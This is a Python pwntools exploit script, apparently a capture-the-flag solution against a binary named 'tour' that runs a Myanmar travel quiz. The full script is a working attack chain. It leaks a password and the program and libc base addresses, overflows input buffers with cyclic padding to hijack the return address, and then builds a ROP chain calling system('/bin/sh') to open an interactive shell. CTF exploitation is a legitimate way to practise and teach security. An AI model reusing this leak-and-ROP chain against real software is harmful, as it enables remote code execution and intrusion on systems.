#!/usr/bin/python3

from pwn import *

exe = ELF("tour", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                b*load_luggage+73
                b*menu +305
                # b*check_luggage
                c
                """,
        )
        input()


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("")
else:
    p = process(exe.path)

GDB()


def luggage(payload):
    sla(b"choice: ", b"1")
    sla(b"is?\n", payload)


def ride():
    sla(b"choice: ", b"2")
    sla(b"do: ", str(0x100000000))


def recvpass():
    p.recvlines(2)
    return p.recvline(keepends=False)


def quizz_time():
    sla(b"choice: ", b"3")
    sla(b"Choose: ", b"3")
    sla(b"Choose: ", b"2")
    p.recvline()
    leak = u64(p.recvline(keepends=False) + b"\0\0")
    sla(b"Choose: ", b"1")
    sla(b"?\n", b"Daw Aung San Suu Kyi")
    sla(b"?\n", b"135")
    sla(b"?\n", b"Hkakabo Razi")
    sla(b"?\n", b"Shan State")
    sla(b"Choose: ", b"4")
    return leak


def quizz_libc(base):
    sla(b"?\n", b"a")
    sla(b"?\n", b"a")
    sla(b"?\n", b"a")
    exe.address = base
    ret = 0x0000000000001016 + exe.address
    sla(
        b"Myanmar?",
        cyclic(cyclic_find(0x6165616161646161))
        + p64(exe.sym.quizz_time)
        + p64(ret)
        + p64(exe.sym.menu),
    )
    sla(b"Choose: ", b"3")
    sla(b"Choose: ", b"2")
    p.recvuntil(b"answers: \n")
    return u64(p.recvline(keepends=False) + b"\0\0")


def buy_plane(password, payload):
    sla(b"choice: ", b"4")
    sla(b"?\n", password)
    sa(b": ", payload)


def get_shell(payload):
    sla(b"choice: ", b"2")
    
    # sla(b"Choose: ", b"3")
    # sla(b"name: ", b"abc")
    # sla(b"Choose: ", b"2")
    sla(b"?\n", b"a")
    sla(b"?\n", b"a")
    sla(b"?\n", b"a")
    sla(b"?\n", payload)


sla(b"name: ", b"a" * 50)
payload = b"BBBBBBBB" + p8(0xE7)
luggage(payload)
ride()
password = recvpass()
info("password: " + str(password))
leak = quizz_time()
exe.address = leak - 0x3DD8
info("leak: " + hex(leak))
info("exe base: " + hex(exe.address))
buy_plane(password, cyclic(cyclic_find(0x61616861616167)) + p64(exe.address + 0x194E))
sla(b"choice: ", b"2")
sla(b"choice: ", b"2")
libc.address = quizz_libc(exe.address) - 0x219AA0
print(hex(libc.address))

rop = ROP(libc)
rop.ret.address
rop.system(next(libc.search(b"/bin/sh\0")))
payload = flat(cyclic(cyclic_find(0x6165616161646161)), rop.chain())
sla(b"Choose: ", b"4")
sla(b"name:", b'a')
get_shell(payload)
p.interactive()
